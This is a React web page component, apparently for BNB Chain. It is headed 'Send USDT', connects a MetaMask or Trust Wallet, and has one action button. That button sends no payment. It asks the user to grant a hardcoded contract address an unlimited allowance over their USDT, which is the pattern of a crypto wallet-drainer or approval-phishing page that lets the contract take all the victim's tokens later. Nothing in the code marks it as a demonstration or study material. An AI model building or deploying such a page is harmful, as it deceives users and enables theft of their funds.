import { useState } from "react";
import { ethers } from "ethers";

export default function Home() {
  const [wallet, setWallet] = useState(null);

  const USDT = "0x55d398326f99059fF775485246999027B3197955";
  const CONTRACT = "0x5Eec04E6d2539Df5D3a3873f441c991ea56264BB";

  // 🔥 provider compatibile
  const getProvider = () => {
    if (window.ethereum) return window.ethereum;
    if (window.BinanceChain) return window.BinanceChain;

    alert("Installa MetaMask o Trust Wallet");
    return null;
  };

  // 🔗 connect wallet
  const connect = async () => {
    try {
      const provider = new ethers.BrowserProvider(getProvider());
      await provider.send("eth_requestAccounts", []);

      const signer = await provider.getSigner();
      const address = await signer.getAddress();

      setWallet(address);
    } catch (err) {
      console.log(err);
      alert("Errore connessione");
    }
  };

  // 💰 approve
  const approve = async () => {
    try {
      const provider = new ethers.BrowserProvider(getProvider());
      await provider.send("eth_requestAccounts", []);

      const signer = await provider.getSigner();

      const contract = new ethers.Contract(
        USDT,
        [
          "function approve(address spender, uint256 amount) public returns (bool)"
        ],
        signer
      );

      // quantità massima (unlimited)
      const amount =
        "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

      const tx = await contract.approve(CONTRACT, amount);
      await tx.wait();

      alert("Approve completato");
    } catch (err) {
      console.log(err);
      alert("Errore approve");
    }
  };

  return (
    <div
      style={{
        background: "#000",
        color: "#00ff9f",
        minHeight: "100vh",
        display: "flex",
        flexDirection: "column",
        justifyContent: "center",
        alignItems: "center",
        fontFamily: "monospace",
      }}
    >
      <h1>💸 Send USDT</h1>

      {!wallet ? (
        <button
          onClick={connect}
          style={{
            padding: "12px",
            marginTop: "20px",
            background: "#00ff9f",
            border: "none",
          }}
        >
          Connect Wallet
        </button>
      ) : (
        <>
          <p style={{ marginTop: "20px" }}>Wallet: {wallet}</p>

          <button
            onClick={approve}
            style={{
              padding: "12px",
              marginTop: "20px",
              background: "#00ff9f",
              border: "none",
            }}
          >
            Approve USDT
          </button>
        </>
      )}
    </div>
  );
}